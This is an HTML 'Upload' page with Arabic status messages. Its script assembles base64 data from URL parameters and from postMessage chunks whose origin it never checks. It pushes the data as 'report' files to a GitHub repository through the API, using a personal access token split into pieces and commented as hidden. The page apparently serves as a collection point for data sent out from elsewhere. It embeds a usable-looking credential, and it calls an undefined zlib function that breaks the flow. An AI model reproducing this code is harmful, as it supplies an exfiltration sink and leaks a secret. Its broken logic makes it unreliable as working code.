<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Upload</title>
<style>body{background:#000;color:#0f0;text-align:center;padding:100px;font-family:Arial;}</style>
</head><body>
<h1>جاري الرفع...</h1>
<div id="s"></div>

<script>
// Token مخفي
const T = (function(){let p=['github_pat_11A3ZKARI0','Q8CbII0GvNSt_','hv6TMKWiNaMucDwhvOE4tNh9aBtjIB7VkTMj7xnjra','276EGSZZQGRkTKn8W'];return p[0]+p[1]+p[2]+p[3];})();
const API = "https://api.github.com/repos/youssefmettwaly/tero-report/contents/reports";
let full = "", total = 1, received = 0;
const params = new URLSearchParams(location.search);
const status = document.getElementById('s');

if (params.get('total')) {
  total = parseInt(params.get('total'));
  full = params.get('data') || "";
  received = 1;
  status.innerHTML = `تلقي البيانات... 1/${total}`;
} else if (params.get('part')) {
  parent.postMessage({type:"chunk", data:params.get('data'), part:params.get('part')}, "*");
  document.body.innerHTML = "<h2 style='color:#0f0'>تم إرسال الجزء</h2>";
}

window.addEventListener('message', e => {
  if (e.data.type === "chunk") {
    full += e.data.data;
    received++;
    status.innerHTML = `تلقي... ${received}/${total}`;
    if (received === total) {
      const decoded = zlib.inflate(atob(full)); // تحتاج مكتبة zlib.wasm بسيطة أو استخدم atob فقط
      const content = atob(full);
      const fn = `report_${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
      fetch(`${API}/${fn}`, {
        method:'PUT', headers:{'Authorization':`token ${T}`,'Content-Type':'application/json'},
        body:JSON.stringify({message:"report", content:btoa(unescape(encodeURIComponent(content))), branch:"main"})
      }).then(() => {
        document.body.innerHTML = "<h1 style='color:#0f0'>تم الرفع بنجاح!</h1>";
        setTimeout(() => location.href = "https://youssefmettwaly.github.io/tero-report/index.html", 2000);
      });
    }
  }
});
</script>
</body></html>
